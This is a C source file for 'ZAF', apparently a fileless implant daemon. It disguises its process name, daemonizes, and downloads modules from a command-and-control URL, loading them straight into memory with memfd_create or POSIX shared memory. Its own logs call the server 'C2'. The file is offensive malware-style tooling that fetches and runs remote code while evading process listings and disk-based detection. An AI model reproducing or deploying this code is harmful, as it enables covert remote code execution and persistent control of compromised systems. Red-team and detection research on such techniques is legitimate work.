/* 
 *                 === ZAF ===
 *
 *   Background daemon used to assist in loading remote modules in memory
 *   via several available METHODS and presenting them to out of process operators 
 *   for consumption 
 *
 *   METHODS: 
 *     1.POSIX shm_open
 *     2.memfd_create(2) 
 *
 *
 *   CAPABILITIES:
 *
 *
 * Ref: some code from https://x-c3ll.github.io/posts/fileless-memfd_create */


#define _GNU_SOURCE



#include "zaf.h"



int main (int argc, char **argv) {

    argv = save_ps_display_args(argc, argv);
    init_ps_display(ZPS_NAME); // TODO: parmeterize

    fp = fopen (logFile,"w");
    if (fp == NULL) {
        log_error("Main: Log File not created okay, errno = %d", errno);
    }else{
        log_set_fp(fp); 
        //log_set_level(2); //  "TRACE", "DEBUG", >"INFO"<, "WARN", "ERROR", "FATAL"
        log_set_level(ZLOG_LEVEL);  // TODO: paramterize
        log_set_quiet(logquiet); // TODO: parameterize
    }

	log_info("=== ZAF ===\n"); // parameterize

    backgroundDaemonLeader();
    doWork();

    if (fp != NULL){
        fclose (fp);
    }
	return 0;
}

void downloadAutoModules(void){

    char urlbuf[255] = {0}; // TODO: what should this be?
    int  i;
    log_debug("Worker: Trying for C2 download initial modules (if any)...");

    for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
    {
        snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
        log_debug("Worker: Module URL = %s", urlbuf);
        load_mod(head, urlbuf);
    }
}

void initSetup(void){

    if ( setKernel() == 1){
        log_info("Main: memfd_create() is available.");
    }else{
        log_info("Main: only /dev/shm support seems to be available.");
    }

    downloadAutoModules();
}

void doWork(void){

    initSetup();
    setupCmdP();
}

